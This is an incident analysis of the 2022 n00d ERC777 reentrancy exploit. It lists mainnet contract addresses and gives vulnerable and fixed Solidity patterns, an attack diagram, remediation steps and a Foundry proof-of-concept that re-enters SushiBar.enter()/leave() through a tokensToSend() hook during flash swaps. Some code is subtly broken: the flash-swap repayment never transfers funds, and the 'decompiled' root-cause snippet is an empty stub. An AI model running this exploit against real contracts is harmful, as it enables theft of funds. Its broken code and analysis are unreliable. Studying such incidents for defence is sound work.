# n00d — ERC777 tokensToSend() Callback Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | n00d Token (ERC777) |
| **Chain** | Ethereum Mainnet |
| **Loss** | Unconfirmed |
| **n00d Token (ERC777)** | [0x2321537fd8EF4644BacDCEec54E5F35bf44311fA](https://etherscan.io/address/0x2321537fd8EF4644BacDCEec54E5F35bf44311fA) |
| **n00d/WETH Pair** | [0x5476DB8B72337d44A6724277083b1a927c82a389](https://etherscan.io/address/0x5476DB8B72337d44A6724277083b1a927c82a389) |
| **xn00d (SushiBar)** | [0x3561081260186E69369E6C32F280836554292E08](https://etherscan.io/address/0x3561081260186E69369E6C32F280836554292E08) |
| **ERC1820Registry** | [0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24](https://etherscan.io/address/0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24) |
| **WETH** | [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2](https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) |
| **Root Cause** | ERC777 `tokensToSend()` callback triggered during Uniswap V2 flash swap, enabling reentrancy into `SushiBar.enter()`/`leave()` |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/N00d_exp.sol) |

---
## 1. Vulnerability Overview

n00d is a token implemented under the ERC777 standard, where a hook is triggered on token transfer via the ERC1820 registry. The attacker registered their contract as an `ERC777TokensSender` implementer in the ERC1820 registry. When a flash swap was executed on the n00d/WETH Uniswap V2 pair, the `tokensToSend()` hook was triggered as the pair transferred n00d to the attacker. Within this hook, the attacker called SushiBar's `enter()` to receive xn00d, then burned it via `leave()` — repeating this cycle 4 times — exploiting the flash swap reserve imbalance to realize an arbitrage profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ERC777 token hook mechanism
// Sender hook registered via ERC1820 registry
interface IERC777TokensSender {
    // Called before tokens are transferred
    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

// ❌ SushiBar.enter() - no reentrancy protection
contract SushiBar {
    IERC20 public n00d;

    function enter(uint256 _amount) external {
        uint256 totalN00d = n00d.balanceOf(address(this));
        uint256 totalShares = totalSupply();
        uint256 xn00dAmount;

        if (totalShares == 0 || totalN00d == 0) {
            xn00dAmount = _amount;
        } else {
            // ❌ When enter() is reentered from the hook during a flash swap,
            // totalN00d has not yet been updated, resulting in incorrect ratio calculation
            xn00dAmount = _amount * totalShares / totalN00d;
        }

        n00d.transferFrom(msg.sender, address(this), _amount);
        _mint(msg.sender, xn00dAmount);
    }

    function leave(uint256 _share) external {
        uint256 totalShares = totalSupply();
        uint256 n00dAmount = _share * n00d.balanceOf(address(this)) / totalShares;
        _burn(msg.sender, _share);
        n00d.transfer(msg.sender, n00dAmount);
    }
}

// ✅ Correct pattern - ReentrancyGuard
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SafeSushiBar is ReentrancyGuard {
    function enter(uint256 _amount) external nonReentrant {
        // ...
    }

    function leave(uint256 _share) external nonReentrant {
        // ...
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**N00d_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: ERC777 `tokensToSend()` callback triggered during Uniswap V2 flash swap, enabling reentrancy into `SushiBar.enter()`/`leave()`
    function transferFrom(address arg0, address arg1, uint256 arg2) external {}  // 0x23b872dd  // ❌ Unauthorized transferFrom
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] ERC1820.setInterfaceImplementer(
    │         attacker, ERC777TokensSender, attacker
    │       ) registered
    │       Attacker contract registered as tokensToSend() hook recipient
    │
    ├─[2] Flash swap on n00d/WETH pair (repeated 4 times)
    │       For each flash swap:
    │       │
    │       ├─ pair.swap(n00d, 0, attacker, data)
    │       │   └─ ERC777 transfer → tokensToSend() hook triggered
    │       │       │
    │       │       └─[Reenter] SushiBar.enter(n00d_amount)
    │       │                   └─ Receive xn00d at manipulated ratio
    │       │                   └─ SushiBar.leave(xn00d)
    │       │                   └─ Receive more n00d
    │       │
    │       └─ Repay flash swap
    │
    └─[3] Accumulated n00d → swap back to WETH for profit
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IERC1820Registry {
    function setInterfaceImplementer(
        address account,
        bytes32 interfaceHash,
        address implementer
    ) external;
}

interface ISushiBar {
    function enter(uint256 _amount) external;
    function leave(uint256 _share) external;
    function balanceOf(address) external view returns (uint256);
}

interface IUniPair {
    function swap(uint256, uint256, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IERC777 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function send(address, uint256, bytes calldata) external;
}

contract N00dExploit is Test {
    IERC1820Registry erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    ISushiBar xn00d  = ISushiBar(0x3561081260186E69369E6C32F280836554292E08);
    IUniPair pair    = IUniPair(0x5476DB8B72337d44A6724277083b1a927c82a389);
    IERC777 n00d     = IERC777(0x2321537fd8EF4644BacDCEec54E5F35bf44311fA);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_826_379);
    }

    function testExploit() public {
        // [Step 1] Register attacker as ERC777TokensSender in ERC1820
        bytes32 ERC777TokensSenderHash = keccak256("ERC777TokensSender");
        erc1820.setInterfaceImplementer(address(this), ERC777TokensSenderHash, address(this));

        emit log_named_decimal_uint("[Start] n00d balance", n00d.balanceOf(address(this)), 18);

        // [Step 2] Execute 4 flash swaps
        for (uint256 i = 0; i < 4; i++) {
            (uint112 r0, , ) = pair.getReserves();
            pair.swap(uint256(r0) * 50 / 100, 0, address(this), abi.encode(i));
        }

        emit log_named_decimal_uint("[End] n00d balance", n00d.balanceOf(address(this)), 18);
    }

    // ⚡ ERC777 tokensToSend() hook - triggered during flash swap
    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata,
        bytes calldata
    ) external {
        // Reenter: SushiBar.enter() + leave() loop
        if (from == address(pair) && n00d.balanceOf(address(this)) > 0) {
            n00d.approve(address(xn00d), type(uint256).max);
            // enter() → receive xn00d (at manipulated ratio)
            xn00d.enter(n00d.balanceOf(address(this)));
            // leave() → withdraw more n00d
            xn00d.leave(xn00d.balanceOf(address(this)));
        }
    }

    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
        // Repay flash swap
        uint256 repay = amount0 * 1003 / 1000 + 1;
        // Return n00d to the pair
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Reentrancy attack via ERC777 hook |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **OWASP DeFi** | Reentrancy Attack (ERC777 callback variant) |
| **Attack Vector** | ERC1820 hook registration → flash swap → `tokensToSend()` → `enter()`/`leave()` |
| **Preconditions** | No ReentrancyGuard on SushiBar, n00d is ERC777 |
| **Impact** | Abnormal arbitrage profit in n00d tokens |

---
## 6. Remediation Recommendations

1. **Apply ReentrancyGuard**: Add the `nonReentrant` modifier to the `enter()` and `leave()` functions in SushiBar.
2. **Apply CEI Pattern**: In `enter()`, complete share calculation and state updates before the token transfer (`transferFrom`).
3. **ERC777 Token Whitelist**: Manage a whitelist of tokens eligible for deposit into staking bars (e.g., SushiBar), and separately evaluate hook risks when ERC777 tokens are deposited.

---
## 7. Lessons Learned

- **Hook Risks of ERC777**: Unlike ERC20, ERC777's `tokensToSend()` and `tokensReceived()` hooks can execute arbitrary code during a transfer. Any contract handling ERC777 tokens must have reentrancy protection in place.
- **ERC1820 Registry**: Via ERC1820, anyone can register an interface implementer for their own address. This is both a strength of ERC777 hooks and an attack vector.
- **Risks of SushiBar Forks**: Applying the SushiBar pattern to ERC777 tokens introduces reentrancy vulnerabilities. Even if the original code was designed for ERC20 tokens, whenever an ERC777 token is added, the reentrancy safety of all functions must be re-evaluated.